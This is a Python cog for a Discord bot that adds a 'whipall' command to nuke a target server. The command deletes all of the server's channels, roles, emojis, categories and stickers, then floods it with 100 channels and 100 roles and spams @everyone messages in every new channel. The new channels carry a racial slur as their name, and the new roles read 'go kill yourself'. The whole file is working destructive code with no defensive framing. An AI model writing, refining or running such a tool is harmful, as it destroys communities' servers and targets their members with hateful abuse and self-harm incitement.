import discord
from discord.ext import commands
import asyncio

# -----------------------------
# CONFIGURATION
# -----------------------------
ALLOWED_USERS = [1402431821534330911,1167531276467708055, 1115297901829181440]  # Replace with your Discord ID(s)
BLOCKED_GUILDS = [1363562800793915583,1191341745204629535, 1384136902168285218, 1331286968386060328, 1284542162574377032]  # Servers where the command will NOT work

NEW_CHANNEL_NAME = "N I G G E R L M F A O"   # Name for new channels
NEW_ROLE_NAME = "GO KILL YOURSELF FATASS BITCH"         # Name for new roles
NUM_TO_CREATE = 100             # Number of channels and roles to create
NUM_MESSAGES = 25               # Number of messages per channel
MESSAGE_CONTENT = "@everyone get clapped LMAO 🤣"  # Message content
MESSAGE_DELAY = 0.5             # Delay (seconds) between messages to avoid rate limits

# -----------------------------
# COG
# -----------------------------
class WipeAndRebuild(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="whipall")
    async def whip_all(self, ctx, guild_id: int):
        """Wipes a target server and creates new channels/roles/messages (restricted)."""
        # --- Permission check ---
        if ctx.author.id not in ALLOWED_USERS:
            await ctx.send("❌ You are not allowed to use this command.")
            return

        # --- Guild check ---
        guild = self.bot.get_guild(guild_id)
        if not guild:
            await ctx.send("❌ I am not in that server or the ID is invalid.")
            return

        if guild.id in BLOCKED_GUILDS:
            await ctx.send("❌ This server is protected. You cannot use this command here.")
            return

        # --- Confirmation ---
        await ctx.send(f"⚠️ Are you sure you want to wipe **{guild.name}**? Type `CONFIRM` to continue.")

        def check(m):
            return m.author == ctx.author and m.content == "CONFIRM"

        try:
            await self.bot.wait_for("message", check=check, timeout=30)
        except:
            await ctx.send("⏳ Wipe cancelled (no confirmation).")
            return

        # --- Wipe Section ---
        await ctx.send("🧹 Wiping server...")

        # Delete channels
        for channel in guild.channels:
            try:
                await channel.delete()
            except:
                continue

        # Delete roles (skip @everyone)
        for role in guild.roles:
            if role.is_default():
                continue
            try:
                await role.delete()
            except:
                continue

        # Delete emojis
        for emoji in guild.emojis:
            try:
                await emoji.delete()
            except:
                continue

        # Delete categories
        for category in guild.categories:
            try:
                await category.delete()
            except:
                continue

        # Delete stickers
        try:
            stickers = await guild.fetch_stickers()
            for sticker in stickers:
                try:
                    await sticker.delete()
                except:
                    continue
        except:
            pass

        # --- Rebuild Section ---
        await ctx.send("🛠️ Wipe complete! Rebuilding server with new channels, roles, and messages...")

        created_channels = []

        # Create channels
        for _ in range(NUM_TO_CREATE):
            try:
                channel = await guild.create_text_channel(NEW_CHANNEL_NAME)
                created_channels.append(channel)
            except:
                continue

        # Create roles
        for _ in range(NUM_TO_CREATE):
            try:
                await guild.create_role(name=NEW_ROLE_NAME)
            except:
                continue

        # Send messages in each channel
        for channel in created_channels:
            for _ in range(NUM_MESSAGES):
                try:
                    await channel.send(MESSAGE_CONTENT)
                    await asyncio.sleep(MESSAGE_DELAY)
                except:
                    continue

        await ctx.send(f"✅ Rebuild complete! Created {NUM_TO_CREATE} channels and roles, with {NUM_MESSAGES} messages in each channel.")

# -----------------------------
# SETUP
# -----------------------------
async def setup(bot):
    await bot.add_cog(WipeAndRebuild(bot))